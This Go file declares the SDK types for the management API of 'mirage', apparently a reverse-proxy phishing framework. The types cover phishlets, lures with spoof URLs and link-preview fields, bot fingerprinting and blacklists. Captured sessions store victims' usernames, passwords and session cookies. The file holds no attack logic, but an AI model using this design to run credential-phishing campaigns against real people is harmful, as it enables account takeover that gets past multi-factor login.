// Package sdk provides types and a client for the mirage management API.
package sdk

import "time"

// ErrorResponse is returned by the API for all error responses.
type ErrorResponse struct {
	Error string `json:"error"`
}

// PaginatedResponse wraps all list endpoint responses.
type PaginatedResponse[T any] struct {
	Items  []T `json:"items"`
	Total  int `json:"total"`
	Limit  int `json:"limit"`
	Offset int `json:"offset"`
}

// --- Sessions ---

type SessionResponse struct {
	ID           string                       `json:"id"`
	Phishlet     string                       `json:"phishlet"`
	LureID       string                       `json:"lure_id"`
	RemoteAddr   string                       `json:"remote_addr"`
	UserAgent    string                       `json:"user_agent"`
	JA4Hash      string                       `json:"ja4_hash"`
	BotScore     float64                      `json:"bot_score"`
	Username     string                       `json:"username"`
	Password     string                       `json:"password"`
	Custom       map[string]string            `json:"custom"`
	CookieTokens map[string]map[string]string `json:"cookie_tokens"` // domain → name → value
	BodyTokens   map[string]string            `json:"body_tokens"`
	HTTPTokens   map[string]string            `json:"http_tokens"`
	StartedAt    time.Time                    `json:"started_at"`
	CompletedAt  *time.Time                   `json:"completed_at"`
}

// Session event types delivered by StreamSessions.
const (
	EventSessionCreated   = "session.created"
	EventSessionUpdated   = "session.updated"
	EventSessionCompleted = "session.completed"
	EventSessionDeleted   = "session.deleted"
)

// SessionEvent is delivered by StreamSessions for each lifecycle event.
type SessionEvent struct {
	Type    string // one of the EventSession* constants
	Session SessionResponse
}

// SessionFilter scopes a ListSessions request.
type SessionFilter struct {
	Phishlet  string
	Completed *bool
	Since     *time.Time
	Until     *time.Time
	Limit     int
	Offset    int
}

// --- Lures ---

type CreateLureRequest struct {
	Phishlet    string `json:"phishlet"`
	BaseDomain  string `json:"base_domain,omitempty"`
	Path        string `json:"path,omitempty"`
	RedirectURL string `json:"redirect_url,omitempty"`
	SpoofURL    string `json:"spoof_url,omitempty"`
	UAFilter    string `json:"ua_filter,omitempty"`
	OGTitle     string `json:"og_title,omitempty"`
	OGDesc      string `json:"og_desc,omitempty"`
	OGImage     string `json:"og_image,omitempty"`
	OGURL       string `json:"og_url,omitempty"`
	Redirector  string `json:"redirector,omitempty"`
}

type UpdateLureRequest struct {
	RedirectURL *string `json:"redirect_url,omitempty"`
	SpoofURL    *string `json:"spoof_url,omitempty"`
	UAFilter    *string `json:"ua_filter,omitempty"`
	OGTitle     *string `json:"og_title,omitempty"`
	OGDesc      *string `json:"og_desc,omitempty"`
	OGImage     *string `json:"og_image,omitempty"`
	OGURL       *string `json:"og_url,omitempty"`
	Redirector  *string `json:"redirector,omitempty"`
}

type LureResponse struct {
	ID          string    `json:"id"`
	Phishlet    string    `json:"phishlet"`
	BaseDomain  string    `json:"base_domain"`
	Hostname    string    `json:"hostname"`
	Path        string    `json:"path"`
	RedirectURL string    `json:"redirect_url"`
	SpoofURL    string    `json:"spoof_url"`
	UAFilter    string    `json:"ua_filter"`
	PausedUntil *time.Time `json:"paused_until,omitempty"`
	OGTitle     string    `json:"og_title"`
	OGDesc      string    `json:"og_desc"`
	OGImage     string    `json:"og_image"`
	OGURL       string    `json:"og_url"`
	Redirector  string    `json:"redirector"`
}

type GenerateURLRequest struct {
	Params map[string]string `json:"params"`
}

type GenerateURLResponse struct {
	URL string `json:"url"`
}

type PauseLureRequest struct {
	Duration string `json:"duration"` // Go duration string, e.g. "15m", "2h"
}

// --- Phishlets ---

type PhishletResponse struct {
	Name        string `json:"name"`
	ParentName  string `json:"parent_name,omitempty"`
	BaseDomain  string `json:"base_domain"`
	Hostname    string `json:"hostname"`
	DNSProvider string `json:"dns_provider"`
	UnauthURL   string `json:"unauth_url"`
	SpoofURL    string `json:"spoof_url"`
	Enabled     bool   `json:"enabled"`
	Hidden      bool   `json:"hidden"`
}

type EnablePhishletRequest struct {
	Hostname    string `json:"hostname"`
	BaseDomain  string `json:"base_domain"`
	DNSProvider string `json:"dns_provider"`
}

type CreateSubPhishletRequest struct {
	ParentName string            `json:"parent_name"`
	Name       string            `json:"name"`
	Params     map[string]string `json:"params"`
}

// --- Blacklist ---

type BlacklistEntryResponse struct {
	Value string `json:"value"` // IP or CIDR
}

type AddBlacklistEntryRequest struct {
	Value string `json:"value"`
	Note  string `json:"note,omitempty"`
}

// --- BotGuard ---

type BotSignatureResponse struct {
	JA4Hash     string    `json:"ja4_hash"`
	Description string    `json:"description"`
	AddedAt     time.Time `json:"added_at"`
}

type AddBotSignatureRequest struct {
	JA4Hash     string `json:"ja4_hash"`
	Description string `json:"description,omitempty"`
}

type UpdateBotThresholdRequest struct {
	Threshold float64 `json:"threshold"` // 0.0–1.0
}

// --- System ---

type StatusResponse struct {
	Version        string    `json:"version"`
	Uptime         string    `json:"uptime"`
	UptimeSeconds  float64   `json:"uptime_seconds"`
	GoRoutines     int       `json:"goroutines"`
	TotalSessions  int       `json:"total_sessions"`
	ActiveSessions int       `json:"active_sessions"`
	StartedAt      time.Time `json:"started_at"`
}
